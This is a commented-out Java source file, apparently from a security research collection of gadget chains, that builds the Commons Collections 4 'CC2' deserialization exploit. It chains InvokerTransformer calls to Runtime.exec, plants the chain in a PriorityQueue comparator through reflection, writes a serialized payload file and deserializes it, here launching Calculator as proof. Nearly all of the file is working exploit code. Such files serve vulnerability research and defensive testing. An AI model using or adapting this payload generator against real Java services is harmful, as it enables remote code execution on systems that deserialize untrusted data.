//package com.sec.exploits.CommonsCollections.CommonsCollections2;
//
//import com.sec.annotation.Dependencies;
//import org.apache.commons.collections4.Transformer;
//import org.apache.commons.collections4.comparators.TransformingComparator;
//import org.apache.commons.collections4.functors.ChainedTransformer;
//import org.apache.commons.collections4.functors.ConstantTransformer;
//import org.apache.commons.collections4.functors.InvokerTransformer;
//
//import java.io.*;
//import java.lang.reflect.Field;
//import java.util.PriorityQueue;
//
///**
// * @program: Gadgets
// * @description:
// * @author: 0range
// * @create: 2021-05-14 09:42
// **/
///**
// * 	Gadget chain:
// * 		ObjectInputStream.readObject()
// * 			PriorityQueue.readObject()
// * 				PriorityQueue.heapify()
// * 					PriorityQueue.siftDown()
// * 						PriorityQueue.siftDownUsingConparator()
// * 							TransformingComparator.compare()
// * 								InvokerTransformer.transform()
// * 									Method.invoke()
// * 										Runtime.exec()
// */
//
//@Dependencies({
//        "org.apache.commons:commons-collections4:4.0",
//        "jdk1.7 / 1.8 low"
//})
//public class TransformingComparator_Exploit {
//    public static void main(String[] args) throws Exception {
//        Transformer[] raw_payload = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[]{} }),
//                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[]{} }),
//                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"open  /Applications/Calculator.app"})};
//
//        ChainedTransformer chain = new ChainedTransformer(raw_payload);
//        TransformingComparator comparator = new TransformingComparator(chain);
//        PriorityQueue queue = new PriorityQueue(2);
//
//        queue.add(1);
//        queue.add(2);
//
//        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
//        field.setAccessible(true);
//        field.set(queue,comparator);
//
//        try{
//            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc2_TransformingComparator.ser")));
//            outputStream.writeObject(queue);
//            outputStream.close();
//
//            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc2_TransformingComparator.ser")));
//            inputStream.readObject();
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//
//    }
//}
